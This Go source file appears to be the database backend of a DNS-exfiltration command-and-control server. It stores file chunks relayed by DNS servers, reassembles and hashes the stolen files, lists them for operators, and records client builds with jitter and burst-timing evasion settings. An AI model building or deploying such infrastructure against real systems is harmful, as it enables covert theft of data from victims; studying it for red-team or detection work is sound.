package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"fmt"
	"io"
	"time"
)

// ExfilChunkStoreRequest captures the data sent by DNS servers for a single exfil chunk.
type ExfilChunkStoreRequest struct {
	SessionID   string
	JobID       string
	DNSServerID string
	ChunkIndex  int
	TotalChunks int
	FileName    string
	FileSize    int64
	Payload     []byte
}

// ExfilCompletionRecord represents a completion signal from a DNS server.
type ExfilCompletionRecord struct {
	SessionID   string
	JobID       string
	TotalChunks int
	FileName    string
	FileSize    int64
	SourceDNS   string
}

// ExfilTransfer contains metadata surfaced to operators and API consumers.
type ExfilTransfer struct {
	SessionID      string     `json:"session_id"`
	JobID          string     `json:"job_id"`
	SourceDNS      string     `json:"source_dns"`
	FileName       string     `json:"file_name"`
	FileSize       int64      `json:"file_size"`
	TotalChunks    int        `json:"total_chunks"`
	ReceivedChunks int        `json:"received_chunks"`
	Status         string     `json:"status"`
	Note           string     `json:"note"`
	CreatedAt      time.Time  `json:"created_at"`
	UpdatedAt      time.Time  `json:"updated_at"`
	LastChunkAt    *time.Time `json:"last_chunk_at,omitempty"`
	CompletedAt    *time.Time `json:"completed_at,omitempty"`
}

// migration8AddExfilTables introduces tables for dedicated exfil transfer tracking.
func (d *MasterDatabase) migration8AddExfilTables() error {
	_, err := d.db.Exec(`
        CREATE TABLE IF NOT EXISTS exfil_transfers (
            session_id TEXT PRIMARY KEY,
            job_id TEXT,
            source_dns TEXT,
            file_name TEXT,
            file_size INTEGER,
            total_chunks INTEGER DEFAULT 0,
            received_chunks INTEGER DEFAULT 0,
            status TEXT DEFAULT 'receiving',
            note TEXT,
            operator_tag TEXT,
            created_at INTEGER NOT NULL,
            updated_at INTEGER NOT NULL,
            completed_at INTEGER,
            last_chunk_at INTEGER
        );

        CREATE TABLE IF NOT EXISTS exfil_chunks (
            session_id TEXT NOT NULL,
            chunk_index INTEGER NOT NULL,
            data BLOB NOT NULL,
            received_at INTEGER NOT NULL,
            PRIMARY KEY (session_id, chunk_index),
            FOREIGN KEY (session_id) REFERENCES exfil_transfers(session_id) ON DELETE CASCADE
        );

        CREATE TABLE IF NOT EXISTS exfil_artifacts (
            session_id TEXT PRIMARY KEY,
            sha256 TEXT NOT NULL,
            compressed_data BLOB NOT NULL,
            size_bytes INTEGER NOT NULL,
            compressed_bytes INTEGER NOT NULL,
            completed_at INTEGER NOT NULL,
            FOREIGN KEY (session_id) REFERENCES exfil_transfers(session_id) ON DELETE CASCADE
        );

        CREATE TABLE IF NOT EXISTS pending_exfil_completions (
            session_id TEXT PRIMARY KEY,
            total_chunks INTEGER,
            created_at INTEGER NOT NULL,
            FOREIGN KEY (session_id) REFERENCES exfil_transfers(session_id) ON DELETE CASCADE
        );

        CREATE INDEX IF NOT EXISTS idx_exfil_transfers_status ON exfil_transfers(status);
        CREATE INDEX IF NOT EXISTS idx_exfil_transfers_updated ON exfil_transfers(updated_at);
        CREATE INDEX IF NOT EXISTS idx_exfil_chunks_session ON exfil_chunks(session_id);
    `)

	return err
}

func (d *MasterDatabase) migration9AddExfilBuildTable() error {
	_, err := d.db.Exec(`
		CREATE TABLE IF NOT EXISTS exfil_client_builds (
			id TEXT PRIMARY KEY,
			filename TEXT NOT NULL,
			os TEXT NOT NULL,
			arch TEXT NOT NULL,
			domains TEXT NOT NULL,
			resolvers TEXT,
			server_ip TEXT NOT NULL,
			chunk_bytes INTEGER NOT NULL,
			jitter_min_ms INTEGER NOT NULL,
			jitter_max_ms INTEGER NOT NULL,
			chunks_per_burst INTEGER NOT NULL,
			burst_pause_ms INTEGER NOT NULL,
			file_path TEXT NOT NULL,
			file_size INTEGER NOT NULL,
			created_at INTEGER NOT NULL
		);

		CREATE INDEX IF NOT EXISTS idx_exfil_client_builds_created
		ON exfil_client_builds(created_at DESC);
	`)

	return err
}

func (d *MasterDatabase) migration10AddExfilBuildJobsTable() error {
	_, err := d.db.Exec(`
		CREATE TABLE IF NOT EXISTS exfil_build_jobs (
			id TEXT PRIMARY KEY,
			status TEXT NOT NULL,
			message TEXT,
			error TEXT,
			platform TEXT,
			architecture TEXT,
			chunk_bytes INTEGER,
			jitter_min_ms INTEGER,
			jitter_max_ms INTEGER,
			chunks_per_burst INTEGER,
			burst_pause_ms INTEGER,
			server_ip TEXT,
			domains TEXT,
			resolvers TEXT,
			artifact_filename TEXT,
			artifact_path TEXT,
			artifact_download_path TEXT,
			artifact_size INTEGER,
			created_at INTEGER NOT NULL,
			updated_at INTEGER NOT NULL,
			completed_at INTEGER
		);

		CREATE INDEX IF NOT EXISTS idx_exfil_build_jobs_status
		ON exfil_build_jobs(status);

		CREATE INDEX IF NOT EXISTS idx_exfil_build_jobs_created
		ON exfil_build_jobs(created_at DESC);
	`)

	return err
}

// migration11AddExfilSessionTags adds a table to map short session tags to full session IDs.
func (d *MasterDatabase) migration11AddExfilSessionTags() error {
	_, err := d.db.Exec(`
		CREATE TABLE IF NOT EXISTS exfil_session_tags (
			tag TEXT PRIMARY KEY,
			session_id TEXT NOT NULL,
			created_at INTEGER NOT NULL,
			FOREIGN KEY (session_id) REFERENCES exfil_transfers(session_id) ON DELETE CASCADE
		);

		CREATE INDEX IF NOT EXISTS idx_exfil_session_tags_session
		ON exfil_session_tags(session_id);
	`)
	return err
}

// StoreExfilChunk persists a chunk from a DNS server and updates transfer metadata.
func (d *MasterDatabase) StoreExfilChunk(req *ExfilChunkStoreRequest) (*ExfilTransfer, bool, error) {
	if req == nil {
		return nil, false, fmt.Errorf("nil exfil chunk request")
	}
	if req.SessionID == "" {
		return nil, false, fmt.Errorf("session_id is required")
	}

	d.mutex.Lock()
	defer d.mutex.Unlock()

	tx, err := d.db.Begin()
	if err != nil {
		return nil, false, err
	}
	defer func() {
		if err != nil {
			tx.Rollback()
		}
	}()

	if err = d.ensureExfilTransferTx(tx, req.SessionID, req.JobID, req.DNSServerID, req.FileName, req.FileSize, req.TotalChunks); err != nil {
		return nil, false, err
	}

	now := time.Now().Unix()
	inserted := false
	if req.Payload != nil {
		res, errExec := tx.Exec(`
            INSERT INTO exfil_chunks (session_id, chunk_index, data, received_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(session_id, chunk_index) DO NOTHING
        `, req.SessionID, req.ChunkIndex, req.Payload, now)
		if errExec != nil {
			return nil, false, errExec
		}
		if rows, _ := res.RowsAffected(); rows > 0 {
			inserted = true
			if _, err = tx.Exec(`
                UPDATE exfil_transfers
                SET received_chunks = received_chunks + 1,
                    updated_at = ?,
                    last_chunk_at = ?
                WHERE session_id = ?
            `, now, now, req.SessionID); err != nil {
				return nil, false, err
			}
		}
	}

	if req.TotalChunks > 0 {
		if _, err = tx.Exec(`
            UPDATE exfil_transfers
            SET total_chunks = CASE WHEN total_chunks = 0 THEN ? ELSE total_chunks END
            WHERE session_id = ?
        `, req.TotalChunks, req.SessionID); err != nil {
			return nil, false, err
		}
	}

	completed, err := d.tryAssembleExfilTransferTx(tx, req.SessionID)
	if err != nil {
		return nil, false, err
	}

	transfer, err := d.fetchExfilTransferTx(tx, req.SessionID)
	if err != nil {
		return nil, false, err
	}

	if err = tx.Commit(); err != nil {
		return nil, false, err
	}

	// If chunk was duplicate, treat as success but not completed
	if !inserted {
		completed = completed && transfer.Status == "complete"
	}

	return transfer, completed, nil
}

// MarkExfilTransferComplete processes a completion signal from a DNS server.
func (d *MasterDatabase) MarkExfilTransferComplete(req *ExfilCompletionRecord) (*ExfilTransfer, error) {
	if req == nil {
		return nil, fmt.Errorf("nil exfil completion request")
	}
	if req.SessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}

	fmt.Printf("[Master DB] Exfil completion signal for session %s (totalChunks=%d, source=%s)\n",
		req.SessionID, req.TotalChunks, req.SourceDNS)

	d.mutex.Lock()
	defer d.mutex.Unlock()

	tx, err := d.db.Begin()
	if err != nil {
		return nil, err
	}
	defer func() {
		if err != nil {
			tx.Rollback()
		}
	}()

	if err = d.ensureExfilTransferTx(tx, req.SessionID, req.JobID, req.SourceDNS, req.FileName, req.FileSize, req.TotalChunks); err != nil {
		return nil, err
	}

	if req.TotalChunks > 0 {
		if _, err = tx.Exec(`
            UPDATE exfil_transfers
            SET total_chunks = CASE WHEN total_chunks = 0 THEN ? ELSE total_chunks END,
                updated_at = ?
            WHERE session_id = ?
        `, req.TotalChunks, time.Now().Unix(), req.SessionID); err != nil {
			return nil, err
		}
	}

	// Count actual chunks before trying to assemble
	var actualChunks int
	tx.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?`, req.SessionID).Scan(&actualChunks)
	fmt.Printf("[Master DB] Exfil session %s has %d chunks stored (expecting %d)\n", req.SessionID, actualChunks, req.TotalChunks)

	completed, err := d.tryAssembleExfilTransferTx(tx, req.SessionID)
	if err != nil {
		return nil, err
	}

	if !completed && req.TotalChunks > 0 {
		fmt.Printf("[Master DB] Exfil session %s not complete yet, recording pending completion\n", req.SessionID)
		if err = d.recordPendingExfilCompletionTx(tx, req.SessionID, req.TotalChunks); err != nil {
			return nil, err
		}
		if _, err = tx.Exec(`
            UPDATE exfil_transfers
            SET status = 'assembling', updated_at = ?
            WHERE session_id = ? AND status <> 'complete'
        `, time.Now().Unix(), req.SessionID); err != nil {
			return nil, err
		}
	} else if completed {
		fmt.Printf("[Master DB] ✓ Exfil session %s assembled successfully\n", req.SessionID)
	}

	transfer, err := d.fetchExfilTransferTx(tx, req.SessionID)
	if err != nil {
		return nil, err
	}

	if err = tx.Commit(); err != nil {
		return nil, err
	}

	return transfer, nil
}

// ListExfilTransfers returns a paginated set of transfers for operator views.
func (d *MasterDatabase) ListExfilTransfers(limit, offset int) ([]ExfilTransfer, error) {
	if limit <= 0 {
		limit = 100
	}

	d.mutex.RLock()
	defer d.mutex.RUnlock()

	rows, err := d.db.Query(`
        SELECT session_id, job_id, source_dns, file_name, file_size,
               total_chunks, received_chunks, status, note,
               created_at, updated_at, last_chunk_at, completed_at
        FROM exfil_transfers
        ORDER BY updated_at DESC
        LIMIT ? OFFSET ?
    `, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	transfers := []ExfilTransfer{}
	for rows.Next() {
		var t ExfilTransfer
		var created, updated int64
		var jobID, sourceDNS, fileName, note sql.NullString
		var fileSize sql.NullInt64
		var lastChunk, completed sql.NullInt64
		if err := rows.Scan(
			&t.SessionID,
			&jobID,
			&sourceDNS,
			&fileName,
			&fileSize,
			&t.TotalChunks,
			&t.ReceivedChunks,
			&t.Status,
			&note,
			&created,
			&updated,
			&lastChunk,
			&completed,
		); err != nil {
			return nil, err
		}
		if jobID.Valid {
			t.JobID = jobID.String
		}
		if sourceDNS.Valid {
			t.SourceDNS = sourceDNS.String
		}
		if fileName.Valid {
			t.FileName = fileName.String
		}
		if note.Valid {
			t.Note = note.String
		}
		if fileSize.Valid {
			t.FileSize = fileSize.Int64
		}
		t.CreatedAt = time.Unix(created, 0)
		t.UpdatedAt = time.Unix(updated, 0)
		if lastChunk.Valid {
			ts := time.Unix(lastChunk.Int64, 0)
			t.LastChunkAt = &ts
		}
		if completed.Valid {
			ts := time.Unix(completed.Int64, 0)
			t.CompletedAt = &ts
		}
		transfers = append(transfers, t)
	}

	return transfers, rows.Err()
}

// GetExfilTransfer returns a single transfer record.
func (d *MasterDatabase) GetExfilTransfer(sessionID string) (*ExfilTransfer, error) {
	d.mutex.RLock()
	defer d.mutex.RUnlock()

	row := d.db.QueryRow(`
        SELECT session_id, job_id, source_dns, file_name, file_size,
               total_chunks, received_chunks, status, note,
               created_at, updated_at, last_chunk_at, completed_at
        FROM exfil_transfers
        WHERE session_id = ?
    `, sessionID)

	var t ExfilTransfer
	var created, updated int64
	var jobID, sourceDNS, fileName, note sql.NullString
	var fileSize sql.NullInt64
	var lastChunk, completed sql.NullInt64
	if err := row.Scan(
		&t.SessionID,
		&jobID,
		&sourceDNS,
		&fileName,
		&fileSize,
		&t.TotalChunks,
		&t.ReceivedChunks,
		&t.Status,
		&note,
		&created,
		&updated,
		&lastChunk,
		&completed,
	); err != nil {
		if err == sql.ErrNoRows {
			return nil, fmt.Errorf("exfil transfer not found")
		}
		return nil, err
	}

	if jobID.Valid {
		t.JobID = jobID.String
	}
	if sourceDNS.Valid {
		t.SourceDNS = sourceDNS.String
	}
	if fileName.Valid {
		t.FileName = fileName.String
	}
	if note.Valid {
		t.Note = note.String
	}
	if fileSize.Valid {
		t.FileSize = fileSize.Int64
	}

	t.CreatedAt = time.Unix(created, 0)
	t.UpdatedAt = time.Unix(updated, 0)
	if lastChunk.Valid {
		ts := time.Unix(lastChunk.Int64, 0)
		t.LastChunkAt = &ts
	}
	if completed.Valid {
		ts := time.Unix(completed.Int64, 0)
		t.CompletedAt = &ts
	}

	return &t, nil
}

// DeleteExfilTransfer removes an exfil transfer and its associated chunks/artifacts
func (d *MasterDatabase) DeleteExfilTransfer(sessionID string) error {
	d.mutex.Lock()
	defer d.mutex.Unlock()

	tx, err := d.db.Begin()
	if err != nil {
		return err
	}
	defer tx.Rollback()

	// Delete artifacts
	_, err = tx.Exec("DELETE FROM exfil_artifacts WHERE session_id = ?", sessionID)
	if err != nil {
		return fmt.Errorf("failed to delete artifacts: %w", err)
	}

	// Delete chunks
	_, err = tx.Exec("DELETE FROM exfil_chunks WHERE session_id = ?", sessionID)
	if err != nil {
		return fmt.Errorf("failed to delete chunks: %w", err)
	}

	// Delete session tags
	_, err = tx.Exec("DELETE FROM exfil_session_tags WHERE session_id = ?", sessionID)
	if err != nil {
		return fmt.Errorf("failed to delete session tags: %w", err)
	}

	// Delete the transfer
	result, err := tx.Exec("DELETE FROM exfil_transfers WHERE session_id = ?", sessionID)
	if err != nil {
		return fmt.Errorf("failed to delete transfer: %w", err)
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("exfil transfer not found")
	}

	return tx.Commit()
}

// UpdateExfilTransferStatus updates the status of an exfil transfer
func (d *MasterDatabase) UpdateExfilTransferStatus(sessionID, status string) error {
	d.mutex.Lock()
	defer d.mutex.Unlock()

	now := time.Now().Unix()
	result, err := d.db.Exec(`
		UPDATE exfil_transfers 
		SET status = ?, updated_at = ?
		WHERE session_id = ?
	`, status, now, sessionID)
	if err != nil {
		return err
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("exfil transfer not found")
	}

	return nil
}

// GetExfilArtifact reconstructs the decrypted payload for download.
func (d *MasterDatabase) GetExfilArtifact(sessionID string) ([]byte, string, string, error) {
	d.mutex.RLock()
	defer d.mutex.RUnlock()

	var compressed []byte
	var sha string
	var fileName sql.NullString
	err := d.db.QueryRow(`
        SELECT a.compressed_data, a.sha256, t.file_name
        FROM exfil_artifacts a
        JOIN exfil_transfers t ON t.session_id = a.session_id
        WHERE a.session_id = ?
    `, sessionID).Scan(&compressed, &sha, &fileName)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, "", "", fmt.Errorf("artifact not found")
		}
		return nil, "", "", err
	}

	reader, err := gzip.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, "", "", err
	}
	defer reader.Close()

	data, err := io.ReadAll(reader)
	if err != nil {
		return nil, "", "", err
	}

	return data, fileName.String, sha, nil
}

// ensureExfilTransferTx guarantees a transfer row exists and updates metadata.
func (d *MasterDatabase) ensureExfilTransferTx(tx *sql.Tx, sessionID, jobID, dnsID, fileName string, fileSize int64, totalChunks int) error {
	if sessionID == "" {
		return fmt.Errorf("session_id is required")
	}

	now := time.Now().Unix()
	if _, err := tx.Exec(`
        INSERT INTO exfil_transfers (session_id, status, received_chunks, created_at, updated_at)
        VALUES (?, 'receiving', 0, ?, ?)
        ON CONFLICT(session_id) DO NOTHING
    `, sessionID, now, now); err != nil {
		return err
	}

	if jobID != "" {
		if _, err := tx.Exec(`
            UPDATE exfil_transfers
            SET job_id = ?
            WHERE session_id = ? AND (job_id IS NULL OR job_id = '')
        `, jobID, sessionID); err != nil {
			return err
		}
	}

	if dnsID != "" {
		if _, err := tx.Exec(`
            UPDATE exfil_transfers
            SET source_dns = ?
            WHERE session_id = ? AND (source_dns IS NULL OR source_dns = '')
        `, dnsID, sessionID); err != nil {
			return err
		}
	}

	if fileName != "" {
		if _, err := tx.Exec(`
            UPDATE exfil_transfers
            SET file_name = ?
            WHERE session_id = ? AND (file_name IS NULL OR file_name = '')
        `, fileName, sessionID); err != nil {
			return err
		}
	}

	if fileSize > 0 {
		if _, err := tx.Exec(`
            UPDATE exfil_transfers
            SET file_size = ?
            WHERE session_id = ? AND (file_size IS NULL OR file_size = 0)
        `, fileSize, sessionID); err != nil {
			return err
		}
	}

	if totalChunks > 0 {
		if _, err := tx.Exec(`
            UPDATE exfil_transfers
            SET total_chunks = ?
            WHERE session_id = ? AND (total_chunks IS NULL OR total_chunks = 0)
        `, totalChunks, sessionID); err != nil {
			return err
		}
	}

	return nil
}

// tryAssembleExfilTransferTx assembles the artifact if all chunks are present.
func (d *MasterDatabase) tryAssembleExfilTransferTx(tx *sql.Tx, sessionID string) (bool, error) {
	var total int
	err := tx.QueryRow(`
        SELECT total_chunks
        FROM exfil_transfers
        WHERE session_id = ?
    `, sessionID).Scan(&total)
	if err != nil {
		return false, err
	}

	// SHADOW MESH: If total is 0, check pending_exfil_completions for the expected total
	// This handles the case where completion signal arrived before all chunks
	if total == 0 {
		var pendingTotal int
		err := tx.QueryRow(`
			SELECT total_chunks FROM pending_exfil_completions WHERE session_id = ?
		`, sessionID).Scan(&pendingTotal)
		if err == nil && pendingTotal > 0 {
			total = pendingTotal
			// Update the transfer with the total from pending
			tx.Exec(`UPDATE exfil_transfers SET total_chunks = ? WHERE session_id = ? AND total_chunks = 0`,
				pendingTotal, sessionID)
		}
	}

	if total == 0 {
		return false, nil
	}

	// Count actual unique chunks in exfil_chunks table (not the counter)
	// This is more reliable with Shadow Mesh where chunks may arrive from multiple DNS servers
	var actualChunkCount int
	err = tx.QueryRow(`
		SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?
	`, sessionID).Scan(&actualChunkCount)
	if err != nil {
		return false, err
	}

	if actualChunkCount < total {
		return false, nil
	}

	if err := d.assembleExfilTransferTx(tx, sessionID); err != nil {
		return false, err
	}

	if err := d.clearPendingExfilCompletionTx(tx, sessionID); err != nil {
		return false, err
	}

	return true, nil
}

func (d *MasterDatabase) assembleExfilTransferTx(tx *sql.Tx, sessionID string) error {
	// Skip if artifact already exists
	var count int
	if err := tx.QueryRow(`SELECT COUNT(1) FROM exfil_artifacts WHERE session_id = ?`, sessionID).Scan(&count); err != nil {
		return err
	}
	if count > 0 {
		if _, err := tx.Exec(`
            UPDATE exfil_transfers
            SET status = 'complete', completed_at = COALESCE(completed_at, ?), updated_at = ?
            WHERE session_id = ?
        `, time.Now().Unix(), time.Now().Unix(), sessionID); err != nil {
			return err
		}
		return nil
	}

	rows, err := tx.Query(`
        SELECT chunk_index, data FROM exfil_chunks
        WHERE session_id = ?
        ORDER BY chunk_index ASC
    `, sessionID)
	if err != nil {
		return err
	}
	defer rows.Close()

	buffer := bytes.Buffer{}
	for rows.Next() {
		var idx int
		var data []byte
		if err := rows.Scan(&idx, &data); err != nil {
			return err
		}
		buffer.Write(data)
	}
	if err := rows.Err(); err != nil {
		return err
	}

	raw := buffer.Bytes()
	if len(raw) == 0 {
		return fmt.Errorf("no chunk data available for session %s", sessionID)
	}

	hash := sha256.Sum256(raw)
	compressedBuf := bytes.Buffer{}
	gz := gzip.NewWriter(&compressedBuf)
	if _, err := gz.Write(raw); err != nil {
		gz.Close()
		return err
	}
	if err := gz.Close(); err != nil {
		return err
	}

	now := time.Now().Unix()
	if _, err := tx.Exec(`
        INSERT INTO exfil_artifacts (session_id, sha256, compressed_data, size_bytes, compressed_bytes, completed_at)
        VALUES (?, ?, ?, ?, ?, ?)
        ON CONFLICT(session_id) DO NOTHING
    `, sessionID, hex.EncodeToString(hash[:]), compressedBuf.Bytes(), len(raw), compressedBuf.Len(), now); err != nil {
		return err
	}

	if _, err := tx.Exec(`
        UPDATE exfil_transfers
        SET status = 'complete', completed_at = COALESCE(completed_at, ?), updated_at = ?
        WHERE session_id = ?
    `, now, now, sessionID); err != nil {
		return err
	}

	return nil
}

func (d *MasterDatabase) recordPendingExfilCompletionTx(tx *sql.Tx, sessionID string, totalChunks int) error {
	_, err := tx.Exec(`
        INSERT INTO pending_exfil_completions (session_id, total_chunks, created_at)
        VALUES (?, ?, ?)
        ON CONFLICT(session_id) DO UPDATE SET
            total_chunks = excluded.total_chunks,
            created_at = excluded.created_at
    `, sessionID, totalChunks, time.Now().Unix())
	return err
}

func (d *MasterDatabase) clearPendingExfilCompletionTx(tx *sql.Tx, sessionID string) error {
	_, err := tx.Exec(`DELETE FROM pending_exfil_completions WHERE session_id = ?`, sessionID)
	return err
}

func (d *MasterDatabase) fetchExfilTransferTx(tx *sql.Tx, sessionID string) (*ExfilTransfer, error) {
	row := tx.QueryRow(`
        SELECT session_id, job_id, source_dns, file_name, file_size,
               total_chunks, received_chunks, status, note,
               created_at, updated_at, last_chunk_at, completed_at
        FROM exfil_transfers
        WHERE session_id = ?
    `, sessionID)

	var t ExfilTransfer
	var created, updated int64
	var jobID, sourceDNS, fileName, note sql.NullString
	var fileSize sql.NullInt64
	var lastChunk, completed sql.NullInt64
	if err := row.Scan(
		&t.SessionID,
		&jobID,
		&sourceDNS,
		&fileName,
		&fileSize,
		&t.TotalChunks,
		&t.ReceivedChunks,
		&t.Status,
		&note,
		&created,
		&updated,
		&lastChunk,
		&completed,
	); err != nil {
		return nil, err
	}

	// Handle nullable string fields
	if jobID.Valid {
		t.JobID = jobID.String
	}
	if sourceDNS.Valid {
		t.SourceDNS = sourceDNS.String
	}
	if fileName.Valid {
		t.FileName = fileName.String
	}
	if note.Valid {
		t.Note = note.String
	}
	if fileSize.Valid {
		t.FileSize = fileSize.Int64
	}

	t.CreatedAt = time.Unix(created, 0)
	t.UpdatedAt = time.Unix(updated, 0)
	if lastChunk.Valid {
		ts := time.Unix(lastChunk.Int64, 0)
		t.LastChunkAt = &ts
	}
	if completed.Valid {
		ts := time.Unix(completed.Int64, 0)
		t.CompletedAt = &ts
	}

	return &t, nil
}

// GetCompletedExfilSessionsForSync returns a list of session IDs that completed recently.
// This allows DNS servers to sync their local state.
func (d *MasterDatabase) GetCompletedExfilSessionsForSync(since time.Duration) ([]string, error) {
	d.mutex.RLock()
	defer d.mutex.RUnlock()

	cutoff := time.Now().Add(-since).Unix()
	rows, err := d.db.Query(`
		SELECT session_id
		FROM exfil_transfers
		WHERE status = 'complete' AND completed_at > ?
	`, cutoff)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var sessionIDs []string
	for rows.Next() {
		var id string
		if err := rows.Scan(&id); err != nil {
			return nil, err
		}
		sessionIDs = append(sessionIDs, id)
	}
	return sessionIDs, nil
}

// RegisterExfilSessionTag maps a short tag to a full session ID.
func (d *MasterDatabase) RegisterExfilSessionTag(tag, sessionID string) error {
	if tag == "" || sessionID == "" {
		return fmt.Errorf("tag and session_id are required")
	}

	d.mutex.Lock()
	defer d.mutex.Unlock()

	// Ensure the session exists in exfil_transfers first (create placeholder if needed)
	// This is needed because of the foreign key constraint
	var exists int
	err := d.db.QueryRow("SELECT 1 FROM exfil_transfers WHERE session_id = ?", sessionID).Scan(&exists)
	if err == sql.ErrNoRows {
		now := time.Now().Unix()
		_, err = d.db.Exec(`
			INSERT INTO exfil_transfers (session_id, status, received_chunks, created_at, updated_at)
			VALUES (?, 'receiving', 0, ?, ?)
		`, sessionID, now, now)
		if err != nil {
			return fmt.Errorf("failed to create placeholder session: %w", err)
		}
	} else if err != nil {
		return fmt.Errorf("failed to check session existence: %w", err)
	}

	_, err = d.db.Exec(`
		INSERT INTO exfil_session_tags (tag, session_id, created_at)
		VALUES (?, ?, ?)
		ON CONFLICT(tag) DO UPDATE SET
			session_id = excluded.session_id,
			created_at = excluded.created_at
	`, tag, sessionID, time.Now().Unix())

	return err
}

// GetExfilSessionIDByTag retrieves the full session ID for a given tag.
func (d *MasterDatabase) GetExfilSessionIDByTag(tag string) (string, error) {
	if tag == "" {
		return "", fmt.Errorf("tag is required")
	}

	d.mutex.RLock()
	defer d.mutex.RUnlock()

	var sessionID string
	err := d.db.QueryRow("SELECT session_id FROM exfil_session_tags WHERE tag = ?", tag).Scan(&sessionID)
	if err == sql.ErrNoRows {
		return "", nil // Not found
	}
	if err != nil {
		return "", err
	}

	return sessionID, nil
}
